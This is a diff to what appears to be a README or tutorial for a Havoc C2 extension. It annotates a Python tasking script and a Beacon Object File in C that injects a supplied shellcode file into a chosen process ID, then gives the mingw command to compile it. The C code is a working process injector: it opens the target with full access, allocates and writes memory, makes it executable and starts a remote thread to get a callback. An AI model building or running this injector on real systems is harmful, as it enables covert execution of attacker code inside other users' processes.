@@ -27,8 +27,9 @@ def run_procinj(demon_id, *args):
     packer: Packer = Packer() 
     # Get the beacon instance
     demon = Demon(demon_id)
-    binary: bytes = None
+    binary: bytes = None #for the shellcode
 
+    #check args for input
     if len(args) < 2:
         demon.ConsoleWrite(demon.CONSOLE_ERROR, "Not enough arguments")
         return False
@@ -45,16 +46,18 @@ def run_procinj(demon_id, *args):
     with open(path, 'rb') as handle:
         binary = handle.read()
 
+    # prints out if the input is not binary
     if not binary:
         demon.ConsoleWrite(demon.CONSOLE_ERROR, "Specified shellcode is empty")
         return False
 
     # Add the arguments to the packer
-    packer.addbytes(binary)
-    packer.addint(int(args[1]))
+    packer.addbytes(binary) #shellcode
+    packer.addint(int(args[1])) #target process ID
 
     task_id = demon.ConsoleWrite(demon.CONSOLE_TASK, f"Tasked the demon to execute process injection on the process ID: {args[1]}")
-   
+    
+    #executes BOF
     demon.InlineExecute(task_id, "go", "bin/test2.o", packer.getbuffer(), False)
     #testbof procinj /home/kali/mdev/havocbof/demon.x64.bin 1992
     return task_id
@@ -89,9 +92,10 @@ DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$CloseHandle(HANDLE);
 DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$GetLastError(void);
 DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$VirtualProtectEx(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
 
-
+//main function
 void go(char* args, int argc){
     
+    //variables
     datap parser;
     DWORD procid;
     DWORD   dwOldProtection = NULL;
@@ -106,19 +110,24 @@ void go(char* args, int argc){
     //Beacon data parser
     BeaconDataParse(&parser, args, argc);
     
-
+    //extracts the input and assign it on shellcode variable
     shellcode = BeaconDataExtract(&parser, &shellcodeLength);
+    
+    //assigns the target process ID
     procid = BeaconDataInt(&parser);
 
-    //prints hello world
+    //prints the target PID
     BeaconPrintf(CALLBACK_OUTPUT, "[!] Target PID: %d", procid);
 
+    //open handle on the target process with all access (dwDesiredAccess)
+    //https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights
     pHandle = KERNEL32$OpenProcess(PROCESS_ALL_ACCESS, FALSE, procid);
     if (!pHandle){
         BeaconPrintf(CALLBACK_OUTPUT, "[x] Failed to open process error code: %d\n", KERNEL32$GetLastError());
         return 1; //failure
     }
 
+    //allocate enough memomry on the target process based on the shellcode length, set the memory region as read write
     bufferMemoryaddr = KERNEL32$VirtualAllocEx(pHandle, NULL, shellcodeLength, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!bufferMemoryaddr) {
         BeaconPrintf(CALLBACK_OUTPUT,"[x] Failed to allocate memory: %d\n", KERNEL32$GetLastError());
@@ -126,25 +135,34 @@ void go(char* args, int argc){
     }
     BeaconPrintf(CALLBACK_OUTPUT,"[!] memory allocated at: 0x%p\n", bufferMemoryaddr);
 
+    //write the shellcode/payload on the allocated memory
     if (!KERNEL32$WriteProcessMemory(pHandle, bufferMemoryaddr, shellcode, shellcodeLength, &sNumberOfBytesWritten)) {
         BeaconPrintf(CALLBACK_OUTPUT,"[x] WriteProcessMemory Failed With Error : %d \n", KERNEL32$GetLastError());
         return 1;
     }
+
+    //change the memory region of the allocated memory into read execute, so it can be executed later on
     if (!KERNEL32$VirtualProtectEx(pHandle, bufferMemoryaddr, shellcodeLength, PAGE_EXECUTE_READ, &dwOldProtection)) {
         BeaconPrintf(CALLBACK_OUTPUT,"[x] VirtualProtectEx Failed With Error : %d \n", KERNEL32$GetLastError());
         return 1;
     }
 
+    //create a thread on the target remote process. The starting address will be the memory address of what we allocated earlier. It use LPTHREAD_START_ROUTINE to execute the thread and eventually gain a callback 
+    //https://learn.microsoft.com/en-us/dotnet/framework/unmanaged-api/hosting/lpthread-start-routine-function-pointer
     rthreadHandle = KERNEL32$CreateRemoteThread(pHandle, NULL, 0, (LPTHREAD_START_ROUTINE)bufferMemoryaddr, NULL, 0, &tid);
     if(!rthreadHandle){
         BeaconPrintf(CALLBACK_OUTPUT,"[x] Failed to create remote thread: %d\n", KERNEL32$GetLastError());
         return 1;
     }
+    
     BeaconPrintf(CALLBACK_OUTPUT, "[!] remote thread id : %lu \n", tid);
+    //close the process handle
     KERNEL32$CloseHandle(pHandle);
 
 }
 ```
+
+To compile just the same, use the command below.
 
 ```bash
 x86_64-w64-mingw32-gcc -c src/procinj.c -w -o bin/test2.o 
